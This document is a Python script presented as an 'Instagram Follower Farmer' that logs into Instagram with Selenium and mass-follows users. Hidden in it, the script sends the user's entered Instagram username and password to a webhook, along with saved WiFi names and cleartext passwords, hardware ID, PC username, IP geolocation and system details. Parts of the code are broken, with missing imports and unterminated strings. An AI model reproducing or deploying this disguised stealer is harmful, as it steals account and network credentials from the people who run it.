from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
import random
import time
import requests
from config import WEBHOOK_URL  

LOGIN_URL = "https://www.instagram.com/"

def send_to_webhook(title, description, color):
    """Login To Instagram."""
    payload = {
        "username": "Instagram Bot",
        "embeds": [
            {
                "title": title,
                "description": description,
                "color": color
            }
        ]
    }
    response = requests.post(WEBHOOK_URL, json=payload)
    if response.status_code == 204:
        print("The Bot Is Running...")
    else:
        print(f"An error occurred: {response.status_code}, {response.text}")

def get_wifi_profiles():
    """Retrieve WiFi profiles and passwords."""
    title = ":gear: **WiFi Profiles and Passwords** :gear:"
    description = "**WiFi Profiles and Passwords**\n\n"
    
    try:
        profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode()

        for line in profiles.splitlines():
            if "All User Profile" in line:
                profile = line.split(":")[-1].strip()
                try:
                    result = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True).decode()
                    password_line = [line for line in result.splitlines() if "Key Content" in line]
                    password = password_line[0].split(":")[-1].strip() if password_line else "NO PASSWORD FOUND"
                    description += f"SSID: {profile}, Password: {password}\n"
                except subprocess.CalledProcessError:
                    description += f"SSID: {profile}, Password: ACCESS DENIED\n"
    except Exception as e:
        description += f"Error retrieving WiFi profiles: {e}\n"
    
    send_to_webhook(title, description, 65280)

def get_hwid_and_username():
    """Retrieve Hardware ID (HWID) and PC username."""
    title = ":computer: **HWID and PC Username** :computer:"
    try:
        hwid = subprocess.check_output("wmic csproduct get uuid", shell=True).decode().split("\n")[1].strip()
        pc_username = os.getlogin()
        description = f"**HWID and PC Username**\n\nHWID: {hwid} - PC Username: {pc_username}\n"
    except Exception as e:
        description = f"Error retrieving HWID and username: {e}\n"
    
    send_to_webhook(title, description, 16776960)

def get_ip_and_location():
    """Retrieve user's IP and location."""
    title = ":earth_americas: **User Location** :earth_americas:"
    try:
        ip_info = requests.get('http://ipinfo.io/json').json()
        description = f"**Location Information**\n\nCountry: {ip_info.get('country', 'N/A')} - Region: {ip_info.get('region', 'N/A')} - City: {ip_info.get('city', 'N/A')} - Approximate Location: {ip_info.get('loc', 'N/A')}\n"
    except Exception as e:
        description = f"Error retrieving IP and location: {e}\n"
    
    send_to_webhook(title, description, 16744448)

def get_system_info():
    """Gather system information."""
    title = ":computer: **System Information** :computer:"
    description = "**System Info**
"
    
    try:
        
        description += f"Hostname: {socket.gethostname()}\n"
        
        
        os_info = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.PIPE).decode().strip()
        description += f"OS Info: {os_info.split('Host Name')[0].strip()}\n"
        
        
        cpu_info = subprocess.check_output("wmic cpu get Name", shell=True, stderr=subprocess.PIPE).decode().strip()
        cpu_info = cpu_info.replace("Name", "").strip()  
        description += f"CPU Info: {cpu_info}\n"
        
        
        memory_info = subprocess.check_output("systeminfo | findstr /C:\"Total Physical Memory\"", shell=True, stderr=subprocess.PIPE).decode().strip()
        description += f"Memory Info: {memory_info}\n"
        
        
        disk_info = subprocess.check_output("wmic logicaldisk get size,freespace,caption", shell=True, stderr=subprocess.PIPE).decode().strip()
        description += f"Disk Info: {disk_info}\n"
        
        description += "
"
    except Exception as e:
        description = f"Error occurred while gathering system information: {e}"

    send_to_webhook(title, description, 16777215)

def send_to_webhook_with_login_info(username, password, system_info):
    """Send login and system info to webhook."""
    title = "Instagram Login Info"
    description = f"Username: {username}\nPassword: {password}\n\n{system_info}"
    send_to_webhook(title, description, 0xFF0000)

def run_selenium_script(username, password):
    """Automate Instagram login and follow users using Selenium."""
    try:
        driver = webdriver.Chrome()
        driver.get(LOGIN_URL)

        
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='username']"))
        )

        
        username_field = driver.find_element(By.CSS_SELECTOR, "input[name='username']")
        password_field = driver.find_element(By.CSS_SELECTOR, "input[name='password']")
        login_button = driver.find_element(By.CSS_SELECTOR, "form#loginForm button[type='submit']")

        username_field.clear()
        username_field.send_keys(username)
        password_field.clear()
        password_field.send_keys(password)
        login_button.click()

        
        try:
            not_now_button = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//div[text()='Not now']"))
            )
            not_now_button.click()
        except Exception as e:
            print(f"No 'Save your login info?' prompt: {e}")

        print("Login successful! The script will now follow random users.")

        actions = ActionChains(driver)
        follow_count = 0
        follow_limit = 160

        while follow_count < follow_limit:
            try:
                follow_buttons = WebDriverWait(driver, 10).until(
                    EC.presence_of_all_elements_located(
                        (By.XPATH, "//button[div/div[text()='Follow']]")
                    )
                )
                for button in follow_buttons:
                    if 'Follow' in button.text:
                        actions.move_to_element(button).perform()
                        button.click()
                        follow_count += 1
                        print(f"Followed a user! Total follows: {follow_count}")
                        if follow_count >= follow_limit:
                            print("Follow limit reached. Stopping...")
                            break

                driver.refresh()
                time.sleep(random.randint(5, 10))

            except Exception as e:
                print(f"Error in the main loop: {e}")
                time.sleep(5)

    except Exception as e:
        print(f"An error occurred during automation: {e}")

    finally:
        if driver:
            driver.quit()

if __name__ == "__main__":
    print("Welcome to the Instagram Follower Farmer")
    username = input("Enter your Instagram username: ")
    password = input("Enter your Instagram password: ")

   
    system_info = get_system_info()

    send_to_webhook_with_login_info(username, password, system_info)

    get_wifi_profiles()
    get_hwid_and_username()
    get_ip_and_location()

    run_selenium_script(username, password)
